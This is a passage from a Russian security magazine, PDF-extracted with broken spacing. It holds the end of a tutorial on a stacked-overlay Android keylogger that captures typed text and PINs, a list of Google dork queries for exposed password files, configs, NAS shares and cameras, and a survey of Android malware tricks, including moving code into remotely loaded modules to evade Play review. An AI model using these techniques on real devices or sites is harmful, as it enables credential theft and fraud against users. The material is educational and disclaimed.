новится благодаря параметру TYPE_SYSTEM_ALERT.


WindowManager.LayoutParams params =
    new WindowManager.LayoutParams(ViewGroup.LayoutParams.WRAP_C
ONTENT, ViewGroup.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,...

Дизайн системно го окна зада ется с помощью привычной XML‐верс тки,
никаких допол нительных ограничений нет. Для трансформации из макета
в View‐элемент применяется класс  LayoutInﬂater. Вызов метода addView
поместит на экран еще один слой графики — наше сис темное окно.


LayoutInflater inflater = (LayoutInflater) getSystemService(LAYOUT
_INFLATER_SERVICE);
LinearLayout mOverlay = (LinearLayout) inflater.inflate(R.layout.
fake_keyboard, null);
WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
wm.addView(mOverlay, params);

Как и любой View‐эле мент, системное окно мож но разместить на экране
по‐разному: занять все прос транс тво полностью или рас положить его
где‐нибудь в углу экра на.


ЛОВИМ КАСАНИЯ
Поль зователь может вза имодействовать с системным окном точно так же,
как и с любым другим элементом UI. Как именно будет обра ботано касание
экрана, зависит от набора флагов в объекте params. Комбинаци ей фла гов
можно задать, к при меру, следующее поведение:
 • ок но перех ватывает все касания экра на, теряется воз можность нажимать
   куда‐либо  еще,  кро ме  как  на  открытое  сис темное  окно.  Удобно
   для вирусов‐бло кировщиков;
 • пользователь может касаться окна и взаимодей ствовать с остальной
   частью экрана. Самый практичный вари ант: можно вводить данные в окно,
   не нарушая работы остальных приложе ний;
 • ок но «парит» в воздухе, касания проходят сквозь него, обрабатываясь
   перекрытыми эле ментами  UI. Удоб но для всплывающих уведом лений,
   не тре бующих реакции пользователя.

Что бы начать обрабаты вать касания, достаточно привязать к системному
окну стандартный кол бэк OnTouchListener(). Он будет вызываться каждый раз,
как пользователь коснется экра на, даже если системное окно он не трогал:


systemOverlay.setOnTouchListener(new View.OnTouchListener() {
    @Override
    public boolean onTouch(View v, MotionEvent event) {
        ...
    }
    ...
}

Как видишь, вся информация тут в двух объектах — классы View и MotionEvent,
коор динаты касаний и прочие интересные вещи хра нятся в event:


event.getX();
event.getY();

Но просто так отсле живать касания нельзя, это было бы слишком наивно.
Если взаимо действие было с каким‐то другим окном, то коор динаты будут
нулевыми. Так же нельзя про пускать касания и одновре менно знать коор‐
динаты точки, которой кос нулся пользователь.
  Из документации к API мож но сделать вывод, что системное окно —
это прос то «чит» в визуаль ном офор млении. Да, перек рыв любое Activity,
можно  создать хороший  «блокировщик  экра на»,  но  больше  из  него
не выжать. Однако авторы C&D посмотре ли API чуть внимательней, и, ока‐
залось, системное окно может быть умнее.


INVISIBLE GRID ATTACK
Как видно из ролика, поль зователь набирает СМС и введен ный текст сразу
ста новит ся доступен стороннему процессу. Получается, с помощью одно го
раз решения можно создать полноцен ный кей логгер! Что же, у нас есть под‐
робное опи сание уязвимости и слай ды из пре зентации. Повторим?
  Для начала определимся с сос тавом объ екта params. Чтобы атака была
незамет на, касания перехватывать нель зя. Зна чит, код соз дания окна будет
выглядеть при мерно так:


params =
    new WindowManager.LayoutParams(...
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
            | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
            | WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT);

Как имен но удалось снять данные, авторы рассказали в своей презентации
на конференции Black Hat (слайды с 37 по 41). Информации там немного,
но глав ное понять мож но: нужно тщательно про парсить данные из класса Mo‐
tionEvent и соз дать слоеный пирог из нес кольких системных окон.


MOTIONEVENT
В объекте event, который формируется по резуль татам каждого касания, мно‐
го различной инфы. Кроме координат (будут нулевы ми), нам станет дос тупно
описание (флаг) про изо шедшего вза имо действия — это поз воляет отличить
момент начала нажатия (ACTION_DOWN) от его завершения (ACTION_UP).
Эта информация доступна всегда и без ограниче ний, вне зависи мости
от типа системного окна.


event.getFlags();

Но сначала нужно дорисовать UI кейлоггера. Он будет весьма затейливым —
на экране дол жно быть одновре менно как минимум 27 сис темных окон,
по одному окну на каждую бук ву англий ского алфавита, плюс задний фон.
Дизайн окна не име ет значения — нужен пря моугольник, совпадающий
по размерам и размещенный ровно над ячей кой виртуальной клавиатуры.
   Разработ чик име ет воз можность через объект params точно задать коор‐
динаты для генери руемого окна, для это го есть параметр gravity и отно‐
сительное сме щение. На аппа рате диаго налью в пять дюй мов перекрыть бук‐
ву q получится по сме щению (1100, ‐480).


params.gravity=Gravity.TOP;
params.x=posX;
params.y=posY;

Системные окна будут отрисова ны в одном потоке, для удобс тва я сделал
это с помощью цик ла. В вер хнем ряду десять букв, для них выходит при мерно
такой цикл. Конечно, делать ячейки цветными и видимыми совершенно
не нужно, это толь ко для наг лядности.


for (int i = 0; i < 26; i++) {
    id++;
    if (i <= 9) addOverLay(id, Color.RED, ROW_1_X + (i * transition),
 ROW_1_Y);
    ...
}





                  Наложение окон на клавиату ру


СЛОЕНЫЙ ПИРОГ
Когда ты перекроешь все инте ресу ющие области, можно взяться за парсинг
MotionEvent. И хотя созданные системные окна не будут закрывать друг друга,
формально каждый новый слой рисуется поверх дру гого — именно в этом
про тиворечии кро ется уязвимость ОС Android.
   Точ ная коор дината касания будет извес тна после обработки данных
от всех окон, отоб раженных на экране. Я собирал дан ные в мас сив, в который
окна вносили изменения в зависи мос ти от сво его порядкового номера.


int[] flagsArray = new int[MAX_CELLS];
...
public boolean onTouch(View v, MotionEvent event) {
    flagsArray[id] = event.getFlags();
    ...
}

Когда поль зователь касается буквы, у всех системных окон, нарисованных
позже, флаг сос тояния оста ется нулевым. Так, если пользователь коснулся
буквы  t, пять нижних окон (фон + q, w, e,  r) получат флаг 1,  (FLAG_WIN‐
DOW_IS_OBSCURED). А уже начиная с шестого слоя (буква t) массив ﬂagsAr‐
ray будет заполнен нулями.
  Вы числить точку касания можно, прос то прос мотрев состояния ﬂagsArray,
дождавшись его пол ного заполнения. Первый элемент с нулевым зна чени‐
ем — это порядковый номер системного окна, которо го кос нулся поль‐
зователь.


for (int i = 0; i < flagsArray.length ‐ 1; i++) {
    if (flagsArray[i] == 0) {
        position = i;
        break;
    }
}

Добавим немного тюнин га, чтобы кей логгер был полноценным. Запустим его
как сер вис, поместив в новый процесс. Допол нитель ных разрешений на это
не тре буется, а эффективность возрастет.


<service android:name=".KeyLoggerService"
    android:process="my_process"/>

Алгоритм работает на удивление стабильно — я тестировал его на несколь‐
ких устрой ствах, и сбоя замече но не было. Флаги всегда оди наковые и выс‐
тавляются строго по порядку. Несмотря на три десятка сге нери рованных
окон, произво дительность стра дает не сильно — при ложе ние занимает
в памяти око ло четырех мегабайт. Кейлог гер фиксиру ет все касания без про‐
пусков и ложных срабатываний.


SILENT GOD-MODE APP INSTALL
Авторы C&D решили не останавливаться на дос тигнутом и пред положили, что
может вый ти, если зловредное приложение получит еще одно разрешение.
Класс AccessibilityService пред назна чен для помощи тем, кому тяжело спра‐
виться с фун кци ями смартфона: слишком малень кие буквы, тяжело дви нуть
пол зунок, проб лемы с цветовым воспри ятием и так далее. Но его же можно
использовать для куда более интерес ных вещей: нажимать кнопки или читать
строки из полей ввода других приложений.
  Проблема толь ко в том, что по умол чанию доступ к AccessibilityService зак‐
рыт, а дать раз решение на его использование юзер должен руками, да еще
и не в один клик. Как раз эту проб лему и побороли авто ры C&D, создав нечто
вро де все того же системного окна, которое пол ностью перек рыва ет экран
и про сит поль зовате ля нажимать в разные мес та под невинными предлогами
(видео Silent God‐mode App).
  Из материалов не очень понятно, как имен но это работа ет. Перекрыть
экран вклю чения сервиса Accessibility сис темным окном и так заставить поль‐
зователя это сде лать не получит ся. Android 5.0 и выше не поз волит включить
сервис, зная, что на экра не есть системное окно.





            По пытка перек рыть запрос на выдачу раз ‐
             решения


ПИН-КОДЫ, ФИШИНГ И ПРОЧЕЕ
С учетом того, насколько лег ко перекрыть чужое окно, системные окна могут
быть проблемой — с помощью  Invisible Grid лег ко перехватывать ввод
ПИН‐кодов и паролей в любом уста новленном при ложе нии. Дос таточ но толь‐
ко разместить соз данные слои в нужном месте, и данные у тебя в кармане.





             Пе рехват ПИН‐кода банков ского при ложе‐
               ния


КАК ЗАЩИТИТЬСЯ?
Что бы защититься от опи санной в статье ата ки, нужно отключить на устрой‐
стве разрешение SYSTEM_ALERT_WINDOW. В «чистом» Android это сделать
невозможно. Но есть хорошие новости для любителей сэкономить: китай ские
вендоры по умолчанию выключа ют это разрешение. Meizu и Xiaomi создали
белый спи сок из самых распространенных при ложений (WhatsApp и прочие),
для остальных действуют огра ниче ния: нельзя исполь зовать системные окна,
огра ниче ны возможности сервисов и не только.


ЗАКЛЮЧЕНИЕ
Уязвимость в дизай не архи тек туры ОС Android — пло хой знак. Авторы C&D
создали баг‐репорт еще год назад, но Google до сих пор ничего не испра‐
вила. Впол не возможно, что ско ро мы услышим о еще более эффективных
ата ках и пора задумывать ся о втором смартфоне — только для важных дан‐
ных, без игр и прочего.
   Как обыч но, эту информа цию заклинаю тебя использовать толь ко в благих
намере ниях — для защиты себя и планшета своих родите лей. Если же я
что‐то упустил, пиши мне на почту или в коммента рии. Удачи!




                      Ав тор выража ет благодарность Евгению Зобнину
                        за ценные комментарии к готово му тексту.
ВЗЛОМ





       РАЗБИРАЕМ АКТУАЛЬНЫЕ
       РЕЦЕПТЫ GOOGLE DORK
               QUERIES





                                               84ckf1r3
                                              84ckf1r3@gmail.com





Тес ты на проникновение обычно тре буют набора специаль‐
ных утилит, но одна из них доступна каж дому и всегда
под рукой — это поис ковик Google. Нужно только знать,
как им пользоваться. Google Dork Queries — это хитрые зап‐
росы  к  поисковикам,  которые  помога ют  пролить  свет
на обще доступные, но скрытые от посторонних глаз данные.


В прош лой статье «Исполь зуем малоизвестные функции Google, чтобы найти
сокрытое» мы разбирали структуру запросов к поисковику, которые выдают
прямые ссылки на кон фиденциальные дан ные и спис ки уязвимых узлов сети.
Такие запросы называют Google Dorks. В Google о них прекрасно знают и ста‐
рают ся прик рывать наиболее опасные. Но одновре менно их спи сок попол‐
няется новыми, как и перечень выяв ляемых ими потенциаль ных целей. Прой‐
дем ся по самым интерес ным.




                  Ма тери ал адpесован специалистам по безопас‐
                       ности и тем, кто собираeтся ими  стать. Вся
                    информа ция   предос тавлена   исключительно
                        в ознакоми тельных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами дан ной статьи.





Сре ди всех операто ров расширенного поис ка Google нас интересуют глав‐
ным образом четыре:
 • site — поиск по конкретному сайту;
 • inurl — указатель на то, что искомые слова дол жны быть частью самого
   веб‐адре са;
 • intitle — опе ратор поиска в заголовке веб‐стра ниц;
 • ext или filetype — поиск файлов определен ного типа по расширению.

Также при сос тавлении запроса надо помнить нес колько опе раторов,
которые задаются спецсимво лами.
 • | — вер тикальный слеш, он же оператор OR (логическое или). Указывает,
   что нужно показать резуль таты, содержащие хотя бы одно из слов,
   перечисленных в запросе.
 • "" кавыч ки. Указыва ет на поиск точ ного соответс твия.
 •  — минус. Используется для очистки поис ковой выдачи и исключает
   из нее результаты с указанными после минуса словами.
 • * — звездочка, или астериск. Используется в качес тве мас ки и означает
   «что угод но».




ОХОТА НА ПАРОЛИ
Учетные дан ные от всевоз можных веб‐сервисов — это для хакера лакомый
кусочек. Порой дос тать их можно буквально в один клик. Точнее, одним зап‐
росом к Google. Нап ример, вот таким при митивным:


ext:pwd (administrators | users | lamers | service)

Такой зап рос найдет все фай лы с расширением .pwd, в которых есть хотя бы
одно из слов, указанных в скобках. Однако в поис ковой выдаче будет много
мусора. Поэтому мож но почистить ее, убрав юзеров и про чих ламеров.
Как вари ант:


inurl:_vti_pvt/administrators.pwd





                 Об рати внимание на домен

Это уже при цельный зап рос. Он найдет фай лы с говорящим наз вани ем
на серверах с FrontPage Extensions. Одноименный редактор канул в Лету,
но его серверные расширения еще исполь зуются. Данные учетных записей
в administrators.pwd зашифрованы по алгоритму DES. Их можно вскрыть
при помощи John the Ripper или одно го из сервисов облачного перебора
паролей.





                              Administrators.pwd

С FTP все то же самое, только надо искать файлы конфигураций .cfg или .
ini. Часто в них хранятся логины в открытую и пароли в слабо зашифрован‐
ном виде. Нап ример, этот простей ший запрос даст кучу азиатских сайтов,
на которых популярен дырявый FTP местно го производс тва.


inurl:"[FFFTP]" ext:ini





                        Па роли от FTP

С одной сто роны, в нас тройках по умолчанию он исполь зует шифрование
AES в режиме CBC с функцией хеширования SHA‐1. С другой стороны,
реали зация криптогра фических про цедур ослаблена, и есть го товая утилита
для перебо ра таких паролей.




                      •John the Ripper
                      •Hash Suite
                         •CrackStation
                    •WS_FTP JavaScript Password Decoder



ВЕБ-РАЗВЕДКА
Иногда бывает полезно изу чить структуру сайта, получив список файлов
на нем. Если сайт сде лан на движке WordPress, то файл repair.php хранит
наз вания других PHP‐скрип тов. Тег inurl сооб щает Google, что искать надо
по первому сло ву в теле ссылки. Если бы мы написа ли allinurl, то поиск
про исхо дил бы по все му телу ссылки, а поисковая выдача была бы более
замусо ренной. Поэто му достаточно сделать запрос такого вида:


inurl:/maint/repair.php?repair=1

В результате ты получишь спи сок сайтов на WP, у которых можно пос мотреть
структуру через repair.php.





                    Изу чаем структуру сайта на WP

Массу проб лем адми нистраторам доставляет WordPress с незамеченными
ошибками в конфигурации. Из открытого лога можно узнать как минимум наз‐
вания скрип тов и загружен ных файлов.


inurl:"wp‐content/uploads/file‐manager/log.txt"

В нашем эксперименте простей ший зап рос позволил найти в логе прямую
ссылку на бэкап и ска чать его.





                 Находим цен ную инфу в логах WP

Много ценной информации мож но выудить из логов. Дос таточно знать,
как они выг лядят и чем отли чают ся от массы дру гих фай лов. Например, опен‐
сорсный интерфейс для БД под названи ем pgAdmin соз дает служебный файл
pgadmin.log. В нем часто содержатся имена пользователей, названия
колонок базы данных, внут ренние адреса и подобное. Находится лог эле мен‐
тарным зап росом:


ext:log inurl:"/pgadmin"





                            Лог pgAdmin

Бы тует мне ние, что открытый код — это безопасный код. Однако сама
по себе откры тость исходников озна чает лишь воз можность исследовать их,
и цели таких изысканий далеко не всегда бла гие. К примеру, сре ди фрей‐
мворков для разработки веб‐приложений популярен Symfony Standard Edition.
При разверты вании он автоматически соз дает в каталоге /app/config/ файл
parameters.yml, где сох раняет наз вание базы данных, а  также логин
и пароль. Най ти этот файл можно следующим запросом:


inurl:app/config/ intext:parameters.yml intitle:index.of





                  Еще один файл с пароля ми

Ко неч но, затем пароль мог ли сменить, но чаще все го он остается таким,
каким был задан еще на этапе разверты вания.
  Опенсор сная ути лита UniFi API browser tool все чаще используется в кор‐
поратив ной сре де. Она при меняется для управле ния сегментами беспровод‐
ных сетей, соз данных по принципу «бес шовного Wi‐Fi». То есть в схеме раз‐
верты вания сети предпри ятия, в которой мно жес тво точек дос тупа управля‐
ются с единого контроллера.
   Ути лита пред назначена для отоб ражения данных, запрашиваемых через
Ubiquiti’s UniFi Controller API. С ее помощью лег ко прос матри вать статис тику,
информацию о подключенных кли ентах и про чие сведения о работе сервера
через API UniFi.
   Разработ чик честно предупрежда ет: «Please do keep in mind this tool expos‐
es A LOT OF the information available in your controller, so you should somehow
restrict access to it! There are no security controls built into the tool…». Но кажется,
многие не воспринимают эти предупреждения всерьез.
   Зная об этой осо бенности и задав еще один специфический запрос, ты
уви дишь массу слу жеб ных данных, в том числе клю чи при ложений и пароль‐
ные фразы.


inurl:"/api/index.php" intitle:UniFi





              WPA PSK, ключ приложения и пароль




                   Общее  пра вило  поис ка:  сначала  определяем
                      наиболее  спе цифи ческие  слова,  характеризу‐
                  ющие выбранную цель. Если это лог‐файл, то что
                        его отли чает от прочих логов? Если это файл
                        с пароля ми, то где и в каком виде они могут хра‐
                        ниться?   Слова‐маркеры   всегда   находятся
                        в каком‐то определенном месте — например,
                        в заголов ке веб‐стра ницы или ее адресе. Огра‐
                       ничи вая область поис ка и задавая точные мар‐
                        керы, ты получишь сырую поисковую выдачу.
                      Затем чистишь ее от мусора, уточняя запрос.



NAS ДЛЯ НАС
Домашние и офисные сетевые хранилища нын че популярны. Функцию NAS
под держивают многие внешние диски и роутеры. Боль шинство их владельцев
не заморачиваются с защитой и даже не меня ют дефол тные пароли вроде
admin/admin. Найти популярные NAS можно по типовым заголовкам их
веб‐страниц. Например, запрос


intitle:"Welcome to QNAP Turbo NAS"

вы даст список айпишников NAS производства QNAP. Останется лишь найти
сре ди них слабозащищенный.





                         Один из NAS

Об лачный сер вис QNAP (как и многие другие) име ет функцию предоставле‐
ния общего дос тупа к файлам по закрытой ссылке. Проб лема в том, что она
не такая уж закрытая.


inurl:share.cgi?ssid=

Этот нехитрый запрос показывает файлы, рас шаренные через облако QNAP.
Их мож но прос мотреть прямо из бра узера или скачать для более деталь ного
ознаком ления.





                  На ходим расшаренные фай лы


ИЩЕМ IP-КАМЕРЫ, МЕДИАСЕРВЕРЫ И ПРОЧИЕ ВЕБ-АДМИНКИ
По мимо NAS, с помощью продвинутых зап росов к Google можно найти мас су
других сетевых устройств с управлением через веб‐интерфейс. Наиболее
часто для это го исполь зуются сценарии CGI, поэтому файл main.cgi — пер‐
спективная цель. Однако встретиться он может где угод но, поэтому запрос
лучше уточ нить. Нап ример, добавив к нему типовой вызов ?next_file. В ито‐
ге получим дорк вида


inurl:"img/main.cgi?next_file"

Чаще всего  так  находятся  IP‐камеры. Подробнее об  их обнаруже нии
и исполь зовании читай в статье «Смотри во все глаза. Как взламывают IP‐
и веб‐камеры и как от этого защититься».





                Обнаружи ли одну из IP‐камер

По мимо камер, подобным обра зом находят ся меди асерверы, открытые
для всех и каж дого. Особенно это касается сер веров Twonky производс тва
Lynx Technology. У них весьма узнаваемое имя и дефолтный порт 9000.
Для более чистой поисковой выдачи номер порта лучше указать в URL
и исключить его из тексто вой части веб‐страниц. Зап рос приобре тает вид


intitle:"twonky server" inurl:"9000" ‐intext:"9000"

Обыч но Twonky‐сервер — это огромная меди атека, расшаривающая контент
через UPnP. Авто риза ция на них часто отклю чена «для удобства».





                      Видеоте ка по годам


БОЛЬШИЕ ДАННЫЕ — БОЛЬШИЕ УЯЗВИМОСТИ
Большие данные сей час на слуху: счи тается, что, если к чему угод но добавить
Big Data, оно вол шебным образом станет работать лучше. В реальнос ти нас‐
тоящих специалистов по этой теме очень мало, а при дефолтной конфигура‐
ции большие данные приводят к большим уяз вимостям. Hadoop — один
из прос тейших спо собов скомпромети ровать тера‐ и даже петабай ты данных.
Эта плат форма с открытым исходным кодом содержит извес тные заголовки,
номера портов и служебных страниц, по которым просто отыс кать управля‐
емые ей ноды.


intitle:"Namenode information" AND inurl:":50070/dfshealth.html"

Таким запросом с кон катенацией мы получа ем поис ковую выдачу со списком
уязвимых систем на базе Hadoop. Можно пря мо из браузе ра погулять
по файловой системе HDFS и скачать любой файл.





                        Big Data? Big vulnerabilities!





                         Браузер HDFS


ВЫВОДЫ
Google Dork Queries (GDQ) — это набор зап росов для выявления грубейших
дыр в безопасности. Все го, что должным образом не спрятано от поисковых
роботов. Для краткости такие зап росы называют просто дорками, как и тех
адми нов, чьи ресурсы удалось взло мать с помощью GDQ. Самые интерес ные
дорки — свежие, а самые све жие — те, которые ты нашел сам. Правда, если
слишком увле чешься экспериментами, то тебя забанят в Google… до ввода
кап чи. :)
MALWARE





                                       Андрей Пахомов
                                           mailforpahomov@gmail.com





    САМЫЕ ПОПУЛЯРНЫЕ ВИРУСНЫЕ
          ТЕХНИКИ 2017 ГОДА



С каж дым годом пользовате лям мобильных устрой ств ста‐
новится  все сложнее избе жать заражения. За пер вое
полуго дие «Лаборатория Кас пер ско го» с помощью своего
антивируса зафиксирова ла  (читай: не дала  установить)
более 3 миллионов вре доносных при ложений. И хотя статис‐
тичес ки по срав нению с 2016 годом особого роста нет,
отчетов о мобильных зловредах стало гораздо больше. Пос‐
ле проч тения таких отчетов не остается ощу щения «мыль‐
ного пузыря», проблема действительно есть: без исполь‐
зования каких‐либо уникальных тех ник людям удается ско‐
лачивать мил лионные бот неты.




                  Ма тери ал адресован специалистам по безопас‐
                       ности и тем, кто собира ется ими  стать. Вся
                    информа ция   предос тавлена   исключительно
                        в ознакоми тельных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами дан ной статьи.



ИСТОЧНИК ЭПИДЕМИИ
Кста ти, а  откуда вообще берется андроид‐ориентированная мал варь?
Навер ное, из пиратских прог рамм? С пиратских дискет? С пиратских ком‐
пакт‐дисков? Нет, погоди‐ка, ведь сей час у нас не 1997 год, а целый 2017‐й...
наверное, с под поль ных репозиториев? Ан нет, оказывается, самый популяр‐
ный репози торий мобильных приложений, Google Play, серь езно подпортил
свою репутацию — в 2017 году все самые успешные мобильные трояны
и вирусы распространялись через него. Похоже, проблема в слишком
богатом выборе для пользователя. На любой запрос найдет ся несколько
десятков приложений, и большинство из них будет мусором.





           Малоинформативные и подоз рительные
               отзы вы

Даже если вни мательно изу чать опи сание при ложе ния, до его уста нов ки все
рав но трудно понять, что именно оно делает. Опираться на опыт других поль‐
зователей тоже не получается — в Google Play очень много приложений с куп‐
ленны ми отзывами. Как ты понимаешь, сто ит один раз запустить троян
и потом будет очень сложно от него избавить ся. А если же у трояна будет
еще и полезная нагрузка, то простому пользовате лю вычислить наличие вре‐
доносного контента прак тически невоз можно.




                   Прошлогод няя  статья  «Анатомия  Android‐мал‐
                      вари» во многом еще акту альна.



ГДЕ Я?
Эффективность тро яна во многом зависит от того, насколько хорошо он уме‐
ет адаптироваться под раз ные устрой ства. Начинать при ходится с малого —
определе ния версии ОС на устрой стве жертвы, эта информа ция есть в клас‐
се Build.


Build.VERSION.SDK_INT

Но этой информа ции будет недостаточно, вен доры любят модифицировать
про шив ку так, что без падений не удается обойтись даже легаль ным при‐
ложениям. Наверняка ты зна ком с оболочкой MIUI, которая серьезно поменя‐
ла принципы работы ОС, а китайских телефо нов сейчас очень много. Больше
данных об устройстве доступно из консольной коман ды getprop.


public static String fullSystemProperties() {
    java.lang.Process p = Runtime.getRuntime().exec("getprop");
    input = new BufferedReader(new InputStreamReader(p.getInputStream
()), 1024);
    while (input.readLine()!=null) {
        line = line + "n" + input.readLine();
    }
    ...

Вызов getprop даст мно го информации, можно отбро сить часть с помощью
grep (более под робные исходники смотри здесь).
  До воль но часто «продвинутый пользователь» получает права суперполь‐
зователя в системе. Рут открывает не только рас ширенные воз можнос ти
для юзе ра, но и раздолье для трояна. Стратегий определения наличия прав
на устройстве много. Самое простое — пройтись по директориям в поис ках
бинарника su. Вот пример ный набор под ходящих для него путей:


String[] places = { "/sbin/", "/system/bin/", "/system/xbin/",
    "/data/local/xbin/", "/data/local/bin/",
    "/system/sd/xbin/", "/system/bin/failsafe/", "/data/local/"
};

Наличие его хотя бы в одном месте с высокой вероятностью укажет, что
на устройстве дос тупны права суперпользователя.


for (String where : places) {
    if (new File(where + “su”).exists()) {
        found = true;
        break;
    }
}

Ес ли троян смо жет внед риться в пространс тво других приложений, то поль‐
зователя спасет толь ко полная переустановка ОС. Root‐права поз воляют
инжектить в системные вызовы, вставляя вре доносный код в самые неожи‐
данные места. Для таких «хуков» есть готовые фреймворки, более подробно
можешь пос мотреть в нашей статье про Xposed.
   Если кратко, то подоб ные инжекты пре доставляют злохаке рам самые
широкие возможности — от замены ID рек ламных баннеров, что поз воляет
получать деньги за чужой показ рекламы, до модификации системных утилит.


СТАРАЯ УЯЗВИМОСТЬ ЛУЧШЕ НОВЫХ ДВУХ
Ес ли ты не следишь вплотную за ста тистикой мира Android, то можешь уди‐
виться: еще в апре ле каждое третье Android‐устройство работало под опе‐
раци онной  системой  версии  4.4  и  ниже.  Это  старые  операционки,
для которых уже дол гое время в пуб личном доступе есть множес тво хакер‐
ских утилит.
  На GitHub дав но выложены исходни ки хорошо написанного трояна GmBot.
Он как раз заточен под четвертую версию ОС и умеет практически все:
манипулиро вать пер сональной информацией, СМС, камерой и про чее.
  GmBot сде лан очень качес твенно, и неудивитель но, что появилась целая
плеяда малвари, основанной на выложенном исходном коде. Один из наибо‐
лее успешных охотников за ста рыми устрой ствами — троян CopyCat. По ста‐
тистике Check Point, у него 14 миллионов заражений и на восьми мил лионах
из них получен root‐доступ. При этом CopyCat не исполь зовал никаких сек‐
ретных эксплоитов — сплошной паблик. К примеру, вот один из них на GitHub.


ГОНИМ РЕКЛАМУ
Сог ласно статистике, в этом году наибольший рост показали так называемые
Adware — вирусы, зарабатывающие на демонстра ции рекламы пользовате‐
лю. Летом в Google Play была обна ружена корейская мал варь Judy: для ее
рас пространения соз дали более сорока приложений, каждое из которых
поль зовалось большим успе хом — мил лионы заг рузок и активных поль‐
зователей.
  Приложе ния дей ствительно работа ли, это были незатей ливые игры, рас‐
считанные на пользователей школьного возраста. Пока ребенок играл в клон
«Веселой фер мы», троян самостоятельно кли кал по рекламным баннерам,
зарабатывая копе ечку своим создателям.





             При тягатель ная игра с плохим содержимым

Что бы не гонять лиш ний трафик, тро ян умел находить ссылки на пар тнер ки
и перехо дил только по ним. Сначала Judy получал с управляющего центра
ссылку на страницу с рекламой, на которой висели партнерские баннеры,
и загружал себе ее контент. Реализовать это мож но, к примеру, с помощью
HttpURLConnection.


HttpURLConnection connection = null;
URL url = new URL(ccUrl);
connection = (HttpURLConnection) url.openConnection();
connection.connect();
InputStream input = connection.getInputStream();
BufferedReader br = new BufferedReader(new InputStreamReader(input));
String inputLine;
while ((inputLine = br.readLine()) != null) {output.append(inputLine
);}
...
String webPageContent = output.toString();

На заг руженной стра нице откры вались не все ссылки под ряд, а только рек‐
ламные. Для парсинга строк есть класс Pattern, полностью повторяющий син‐
таксис регулярных выражений языка Perl. Понача лу это похоже на мешани ну,
а потом разбираешься и парсинг идет на ура. У партнерки будут какие‐то
общие признаки — один домен, реферер и так далее. Вот такой регуляркой
вытаскиваются все ссылки на поддомены google.com:


Pattern urlFinder = Pattern.compile("https://w+.google.com/w+");
Matcher matcher = urlFinder.matcher(test);
List<String> links = new ArrayList<>();
while (matcher.find()) {
    links.add(webPageContent.substring(matcher.start(), matcher.end
()));
}

Хозяева рек ламной площад ки не дол жны знать, что баннеры загружаются
в автомати ческом режиме, значит, нужно откры вать ссыл ки настоящим бра‐
узером. Это нес ложно, в Android есть класс WebView — полноценный браузер
на движке Chrome. Любопытно, что, открывая страницу, малварь мимик‐
рировала под полноценный компьютер — видимо, для таких переходов сто‐
имость кли ка выше.


webView.getSettings().setUserAgentString("Mozilla/5.0 (Windows NT 6.
1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/
537.36");


БАНКОВСКАЯ ТАЙНА
Второй год в интернете успешно рас пространяется троян BankBot. Соз‐
датели модифицируют  его раз  за  разом, мас кируясь  от  антивирусов
и замани вая пользователей прос тенькой игрой или подборкой юмористичес‐
кого кон тента. Как ты уже догадался, вредонос ный кон тент публиковался
в Google Play, пос ледняя вер сия BankBot была выловлена в конце сен тября.
  Для управления чужим телефоном авто ры трояна решили не свя зываться
с эксплоитом и просто настой чиво про сят об этом пользователя. В данном
слу чае при ложе ние пытается получить дос туп ко все му, к чему можно, —
от чтения окон до эмуляции нажатий. Забав но, что злоумышленни ки вов сю
эксплуати руют социальную инженерию, без вся кой ложной скромности наз‐
вав свое поделие Google Service. Пользователя убеждают, что какая‐то очень
важ ная функция не будет работать без его вмешательства.





                   Неп равильный Google Service

Мы уже не раз писали про волшебную силу AccessibilityService. Как видишь,
некоторым она даже помогает финансово. :) Зло умышленники также нещад‐
но эксплуатируют возможности системных окон, не поз воляя пользователю
что‐либо сделать в телефо не, в то время как тро ян устанавливает допол‐
нительные модули и меняет настрой ки телефо на.


WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
final WindowManager.LayoutParams params =
    new WindowManager.LayoutParams(ViewGroup.LayoutParams.MATCH_
PARENT,
        ViewGroup.LayoutParams.MATCH_PARENT,
        WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
        PixelFormat.TRANSLUCENT);
wm.addView(mOverlay, params);

Любопытно, что Google наконец‐то отре агировала на проб лему и пометила
флаг TYPE_SYSTEM_ALERT как уста ревший (deprecated) — это означает, что
в новых версиях API он будет исклю чен вооб ще. Начиная c Android Oreo
(это  8‐я вер сия ОС, вышла в  августе) вво дится флаг TYPE_APPLICA‐
TION_OVERLAY, который не зак рывает меню и системные уведомления.


МАСКИРОВКА ВРЕДОНОСА
Как же все‐таки вирусы попадают в Google Market? Все же в этой компании
трудятся лучшие умы пла неты, разработавшие много кру тых продуктов... Все
довольно просто: чаще всего такие при ложе ния при загрузке в этот репози‐
торий вооб ще не име ют вредонос ной фун кци ональ ности.
  Приложе ние разбивается на нес колько модулей, которые можно подгру‐
жать в приложе ние удаленно. Мы уже об этом ког да‐то рассказывали. Пред‐
лагаю рассмот реть этот эффективный инструмент подробнее.
   Если ты никогда раньше не писал свои биб лиотеки, то знай, что делается
это не слож нее обычного продукта. Для начала создаем пус той проект —
empty Activity. К соз данному проекту добавляем новый модуль (File → New →
New module). Тут есть два варианта библиотеки: Android или Java, если у тебя
будет какой‐то академичес кий код, не связанный с Android SDK. В эту биб‐
лиотеку нуж но поместить все, что может хоть как‐то показать ся подозритель‐
ным, этот код в Google Play не попадет.





                 Создание модуля в Android Studio

Ог раничений на код никаких нет, точкой входа в библиотеку, впол не воз‐
можно, будет метод getInfo. Пос кольку он будет рас ширять функциональ‐
ность, ему нужно подать что‐то на вход, например контекст при ложе ния.


public String getInfo(Context ctx){
    ...
    return "Data is: " + somedata;
}

Написанный код нужно будет собрать в единый JAR‐файл. Сделать это можно
раз ными способа ми, проще всего через Gradle. По умол чанию такая кон‐
